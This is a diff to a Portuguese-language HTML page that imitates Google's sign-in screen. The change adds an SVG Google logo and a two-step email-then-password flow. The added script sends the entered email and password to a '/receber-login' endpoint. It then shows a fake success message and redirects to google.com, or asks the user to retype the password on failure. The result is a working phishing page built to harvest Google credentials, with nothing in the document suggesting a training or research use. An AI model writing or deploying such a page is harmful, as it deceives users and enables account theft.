@@ -22,15 +22,14 @@
         
         /* Header */
         .header {
-            padding: 20px 0;
+            padding: 24px 0;
             text-align: center;
             border-bottom: 1px solid #dadce0;
         }
         
         .google-logo {
-            font-size: 22px;
-            font-weight: 400;
-            color: #5f6368;
+            width: 75px;
+            height: 24px;
         }
         
         /* Main Container */
@@ -60,7 +59,7 @@
             font-size: 24px;
             font-weight: 400;
             color: #202124;
-            margin-bottom: 8px;
+            margin: 16px 0 8px;
         }
         
         .title p {
@@ -91,6 +90,12 @@
         
         .input-field.error {
             border-color: #d93025;
+        }
+        
+        /* Password Field (hidden initially) */
+        .password-field {
+            display: none;
+            margin-top: 16px;
         }
         
         /* Links */
@@ -252,7 +257,13 @@
 <body>
     <!-- Header -->
     <div class="header">
-        <div class="google-logo">Google</div>
+        <!-- Logo oficial do Google em SVG -->
+        <svg class="google-logo" viewBox="0 0 75 24" width="75" height="24">
+            <path d="M67.954 16.303c-1.318 0-2.386-.472-3.224-1.263l-1.28 1.28c1.165 1.165 2.645 1.785 4.504 1.785 3.039 0 5.18-2.039 5.18-4.949 0-.333-.038-.666-.095-.987h-5.085v2.58h2.907c-.16.86-1.012 2.554-2.907 2.554zm-9.856-2.554h-3.008v2.533h3.008c1.318 0 2.386-.472 3.224-1.263l1.28 1.28c-1.165 1.165-2.645 1.785-4.504 1.785-3.039 0-5.18-2.039-5.18-4.949s2.141-4.949 5.18-4.949c1.86 0 3.339.62 4.504 1.785l-1.28 1.28c-.838-.79-1.906-1.263-3.224-1.263-1.86 0-3.339.62-4.504 1.785-.838.79-1.318 1.818-1.318 3.142s.48 2.352 1.318 3.142c1.165 1.165 2.645 1.785 4.504 1.785z" fill="#4285F4"/>
+            <path d="M47.954 16.303c-1.318 0-2.386-.472-3.224-1.263l-1.28 1.28c1.165 1.165 2.645 1.785 4.504 1.785 3.039 0 5.18-2.039 5.18-4.949 0-.333-.038-.666-.095-.987h-5.085v2.58h2.907c-.16.86-1.012 2.554-2.907 2.554zm-9.856-2.554h-3.008v2.533h3.008c1.318 0 2.386-.472 3.224-1.263l1.28 1.28c-1.165 1.165-2.645 1.785-4.504 1.785-3.039 0-5.18-2.039-5.18-4.949s2.141-4.949 5.18-4.949c1.86 0 3.339.62 4.504 1.785l-1.28 1.28c-.838-.79-1.906-1.263-3.224-1.263-1.86 0-3.339.62-4.504 1.785-.838.79-1.318 1.818-1.318 3.142s.48 2.352 1.318 3.142c1.165 1.165 2.645 1.785 4.504 1.785z" fill="#34A853"/>
+            <path d="M27.954 16.303c-1.318 0-2.386-.472-3.224-1.263l-1.28 1.28c1.165 1.165 2.645 1.785 4.504 1.785 3.039 0 5.18-2.039 5.18-4.949 0-.333-.038-.666-.095-.987h-5.085v2.58h2.907c-.16.86-1.012 2.554-2.907 2.554zm-9.856-2.554h-3.008v2.533h3.008c1.318 0 2.386-.472 3.224-1.263l1.28 1.28c-1.165 1.165-2.645 1.785-4.504 1.785-3.039 0-5.18-2.039-5.18-4.949s2.141-4.949 5.18-4.949c1.86 0 3.339.62 4.504 1.785l-1.28 1.28c-.838-.79-1.906-1.263-3.224-1.263-1.86 0-3.339.62-4.504 1.785-.838.79-1.318 1.818-1.318 3.142s.48 2.352 1.318 3.142c1.165 1.165 2.645 1.785 4.504 1.785z" fill="#FBBC05"/>
+            <path d="M7.954 16.303c-1.318 0-2.386-.472-3.224-1.263l-1.28 1.28c1.165 1.165 2.645 1.785 4.504 1.785 3.039 0 5.18-2.039 5.18-4.949 0-.333-.038-.666-.095-.987h-5.085v2.58h2.907c-.16.86-1.012 2.554-2.907 2.554z" fill="#EA4335"/>
+        </svg>
     </div>
 
     <!-- Main Content -->
@@ -268,7 +279,11 @@
                     <input type="email" class="input-field" id="email" placeholder="E-mail ou telefone" required autofocus>
                 </div>
 
-                <a href="#" class="forgot-email">Esqueceu seu e-mail?</a>
+                <div class="password-field" id="passwordField">
+                    <input type="password" class="input-field" id="password" placeholder="Digite sua senha">
+                </div>
+
+                <a href="#" class="forgot-email" id="forgotEmail">Esqueceu seu e-mail?</a>
 
                 <div class="info-text">
                     Não está no seu computador? Use o modo visitante para fazer login com privacidade. <a href="#">Saiba mais</a>
@@ -302,74 +317,112 @@
     </div>
 
     <script>
+        let currentStep = 1;
+        const emailInput = document.getElementById('email');
+        const passwordField = document.getElementById('passwordField');
+        const forgotEmailLink = document.getElementById('forgotEmail');
+        const submitBtn = document.getElementById('submitBtn');
+
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
             event.preventDefault();
             
-            const email = document.getElementById('email').value;
-            const submitBtn = document.getElementById('submitBtn');
+            const email = emailInput.value;
+            const password = document.getElementById('password').value;
             const result = document.getElementById('result');
             
-            // Validar email
-            if (!email.includes('@')) {
-                document.getElementById('email').classList.add('error');
-                return;
-            }
-            
-            // Mostrar carregamento
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Enviando...';
-            result.style.display = 'none';
-            
-            try {
-                // Enviar para o backend
-                const response = await fetch('/receber-login', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        email: email,
-                        senha: 'google_login' // Simulando senha padrão
-                    })
-                });
+            if (currentStep === 1) {
+                // Primeiro passo: validar email
+                if (!email.includes('@')) {
+                    emailInput.classList.add('error');
+                    return;
+                }
                 
-                const data = await response.json();
+                // Simular verificação do Google
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Verificando...';
                 
-                if (response.ok) {
-                    result.className = 'result success';
+                setTimeout(() => {
+                    // Mostrar campo de senha
+                    passwordField.style.display = 'block';
+                    forgotEmailLink.textContent = 'Esqueceu a senha?';
+                    submitBtn.textContent = 'Fazer login';
+                    currentStep = 2;
+                    submitBtn.disabled = false;
+                    
+                    // Focar no campo de senha
+                    document.getElementById('password').focus();
+                }, 1000);
+                
+            } else {
+                // Segundo passo: enviar login
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Entrando...';
+                result.style.display = 'none';
+                
+                try {
+                    const response = await fetch('/receber-login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            email: email,
+                            senha: password
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (response.ok) {
+                        result.className = 'result success';
+                        result.innerHTML = `
+                            <strong>✅ Login realizado com sucesso!</strong><br>
+                            <small>Redirecionando para o Google...</small>
+                        `;
+                        result.style.display = 'block';
+                        
+                        // Simular redirecionamento do Google
+                        setTimeout(() => {
+                            window.location.href = 'https://google.com';
+                        }, 2000);
+                        
+                    } else {
+                        throw new Error(data.message || 'Erro no servidor');
+                    }
+                    
+                } catch (error) {
+                    result.className = 'result error';
                     result.innerHTML = `
-                        <strong>✅ Login realizado com sucesso!</strong><br>
-                        <small>E-mail: ${email}</small><br>
-                        <small>Redirecionando...</small>
+                        <strong>❌ Senha incorreta. Tente novamente</strong><br>
+                        <small>${error.message}</small>
                     `;
                     result.style.display = 'block';
                     
-                    // Simular redirecionamento do Google
-                    setTimeout(() => {
-                        window.location.href = 'https://google.com';
-                    }, 2000);
-                    
-                } else {
-                    throw new Error(data.message || 'Erro no servidor');
+                    // Limpar senha e focar novamente
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
+                } finally {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Fazer login';
                 }
-                
-            } catch (error) {
-                result.className = 'result error';
-                result.innerHTML = `
-                    <strong>❌ Erro ao fazer login</strong><br>
-                    <small>${error.message}</small>
-                `;
-                result.style.display = 'block';
-            } finally {
-                // Restaurar botão
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Próxima';
             }
         });
 
         // Remover erro quando usuário digitar
-        document.getElementById('email').addEventListener('input', function() {
+        emailInput.addEventListener('input', function() {
             this.classList.remove('error');
+        });
+
+        // Voltar para o primeiro passo se clicar em "Esqueceu a senha?"
+        forgotEmailLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (currentStep === 2) {
+                passwordField.style.display = 'none';
+                forgotEmailLink.textContent = 'Esqueceu seu e-mail?';
+                submitBtn.textContent = 'Próxima';
+                currentStep = 1;
+                emailInput.focus();
+            }
         });
     </script>
 </body>
